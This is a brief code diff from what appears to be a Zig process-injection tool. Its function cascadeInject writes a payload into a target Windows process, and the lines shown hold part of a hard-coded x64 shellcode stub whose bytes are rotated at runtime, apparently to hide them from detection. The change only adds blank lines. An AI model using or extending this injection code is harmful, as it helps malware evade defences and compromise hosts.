@@ -479,7 +479,9 @@ pub fn cascadeInject(process: [*:0]const u8, payload: *const Buffer, context: ?*
         0x48, 0x83, 0xc4, 0x38, // add rsp, 38h
         0xc3, // retn
     };
+
     ROTL(CASCADE_STUB_X64[33..35], 7); // this will roate the 0x92 to 0x49 and 0x71 to 0xb8 which is the mov r8,
+
     // Initialize process and startup information
     var process_info: windows.PROCESS_INFORMATION = std.mem.zeroes(windows.PROCESS_INFORMATION);
     var startup_info: STARTUPINFOA = std.mem.zeroes(STARTUPINFOA);
